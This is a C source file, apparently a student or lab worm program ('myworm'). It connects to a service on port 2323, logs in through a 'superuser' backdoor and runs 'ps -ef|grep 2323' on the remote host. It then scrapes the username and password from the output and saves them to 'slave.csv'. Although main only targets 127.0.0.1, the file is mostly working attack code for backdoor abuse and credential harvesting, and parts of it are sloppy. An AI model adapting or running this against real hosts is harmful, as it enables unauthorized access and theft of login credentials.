#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>

//Preprocessor for IPaddress
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>

#define MAX_BUF   (1024)

int sockfd;
char actual_id[MAX_BUF];
char actual_pw[MAX_BUF];


//Network Connection
//to port 2323
//return fd
int connect2323(uint32_t ipAddress){
	struct sockaddr_in servaddr;
	uint32_t actual_addr;
	struct sockaddr_in temp;
	int count=0;
	char* ipAddr;

	//socket
	if((sockfd=socket(AF_INET,SOCK_STREAM,0))<0)
	{
		printf("socket error\n");
		return 0;
	}

	//init server address
	memset( &servaddr, 0, sizeof(servaddr));
	servaddr.sin_family=AF_INET;
	servaddr.sin_port=htons(2323);
	actual_addr=htonl(ipAddress);
	temp.sin_addr.s_addr=actual_addr;
	ipAddr=inet_ntoa(temp.sin_addr);
	//connect
	printf("ip : %s \n",ipAddr);
	if(inet_pton(AF_INET,ipAddr,&servaddr.sin_addr)<=0)
		printf("inet_pton error\n");
	if(connect(sockfd,(struct sockaddr*) &servaddr, sizeof(servaddr))<0)
		printf("connect error\n");
	return 1;
}


//try Authenticate
int superAuthenticate(){
	struct timeval tv;
	tv.tv_sec=2;
	setsockopt(sockfd,SOL_SOCKET,SO_RCVTIMEO,(struct timeval*)&tv,sizeof(struct timeval));
   	int r=0;
   	char buf[MAX_BUF];
    	const char* szName = "Username:";
    	const char* szWrongID = "Wrong ID given.";
    	const char* superID="superuser\n";
    	
    	r = readSock( sockfd, buf, MAX_BUF );
	if ( r == -1 ) return -1;

	//check if Username received
	if ( strcmp( buf, szName) != 0 )
		return -1;

	//try to login with superuser
   	r = send( sockfd, superID, strlen(superID), 0 );
    	if ( r == -1 ) { perror( "send" ); return -1; }
    	r = recv( sockfd, buf, 1024, MSG_PEEK | MSG_DONTWAIT);
    	if ( r<0){
    		if(errno==EWOULDBLOCK){
    			//printf("timeout\n");
    			return 1;
    		}
    		else{
    			printf("error receive\n");
    			exit(1);
    		}
    	}
    	//check if Wrong ID received
	if ( strcmp( buf,szWrongID) != 0 )
		return -1;
	else return 1;

}

//GREP ID and PASSWORD
int grep(){
	int r;
	char buf[MAX_BUF];
	char * pch;
	char * id;

	char * pw;
	const char* grep="ps -ef|grep 2323\n";
	r = send( sockfd, grep, strlen(grep), 0 );
	if ( r == -1 ) { perror( "send" ); return -1; }
	r = recv( sockfd, buf, 1023, 0);
	if ( r == -1 ) { perror( "recv" ); return -1; }
	pch=strstr(buf,"2323");
	if(pch==NULL) return -1;
	id=strchr(pch+5,' ');
	if(id==NULL) return -1;
	pw=strchr(id+1,'\n');
	if(pw==NULL) return -1;
	strncpy(actual_id,pch+5,id-pch-5);
	strncpy(actual_pw,id+1,pw-id-1);

	return 0;

}

//Actual Worm
int worm(uint32_t ipAddress){
	int count=0;
	int r;
	char buf[MAX_BUF];
	char input[MAX_BUF];
	int backdoor;
	int result;
	//Make socket file descriptor
	if(!connect2323(ipAddress))
		//In case of fail
		return 0;
	//write
	//write
	backdoor=superAuthenticate();

	//if authenticate fail
	if(backdoor==-1){
		printf("authenticate fail\n");
		return 0;
	}


	result=grep();
	//printf("hey %d\n",result);
	if(result==0)
		return 1;
	else
		return 0;
	//read
	//close
	close(sockfd);
}

int readSock( int sockfd, char* buf, size_t bufLen )
{
    int r;

    r = recv( sockfd, buf, bufLen - 1, 0 );
    if ( r == -1 ) { perror( "recv" ); return -1; }
    buf[r - 1] = '\0';
    return 0;
}


//In case of usageError
int usageError(){
	printf("Usage : ./myworm ip_begin ip_end file_name[optional]\n");
	exit(1);
}

//In case of IP input Error
int inputError(){
	printf("IP address is invalid or range is fault\n");
	exit(1);
}

//Check out valid IP address
//From : http://stackoverflow.com/questions/791982/determine-if-a-string-is-a-valid-ip-address-in-c
bool isValidIpAddress(char *ipAddress)
{
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
    return result != 0;
}

//return uint32 type address from string
uint32_t returnIPAddr(char *ipAddress)
{
    struct sockaddr_in sa;
    uint32_t return_addr;
    inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
    return_addr=sa.sin_addr.s_addr;

    //Debug Purpose printf
    //printf("%u %u\n",sa.sin_addr,return_addr);

    //Since I use intel CPU endian conversion
    return_addr=ntohl(return_addr);

    //Debug Purpose printf
    //printf("ntohl : %u %u\n",sa.sin_addr,return_addr);

    return return_addr;	
}

//Check the IP address range
bool isRangeOK(char *ipAddress1, char *ipAddress2){
	bool validAddr[2];
	uint32_t ipAddr1;
	uint32_t ipAddr2;

	//check if IP address is valid or not
	validAddr[0]=isValidIpAddress(ipAddress1);
	validAddr[1]=isValidIpAddress(ipAddress2);
	return validAddr[0]&&validAddr[1];
}

int main( int argc, char* argv[] )
{
	bool rangeCheck=false;
	uint32_t startAddress;
	uint32_t endAddress;
	int result;
	const char* fileName="slave.csv";
	FILE *fp;

	//check the input
	if(argc!=3 && argc!=4){
		usageError();
	}

	if(argc==4)
		fp=fopen(argv[3], "w");
	else
		fp=fopen(fileName,"w");

	//check the range of IP input and get uint32 type address
	rangeCheck=isRangeOK(argv[1],argv[2]);
	if(rangeCheck)
	{
		startAddress=returnIPAddr(argv[1]);
		endAddress=returnIPAddr(argv[2]);
	}
	//When input IP address itself is invalid
	else
		inputError();

	//When range of IP address is wrong
	if(startAddress>endAddress)
		inputError();

	result=worm(returnIPAddr("127.0.0.1"));
	if(result)
		fprintf(fp,"127.0.0.1 %s %s\n",actual_id,actual_pw);
	fclose(fp);

	return 0;
}

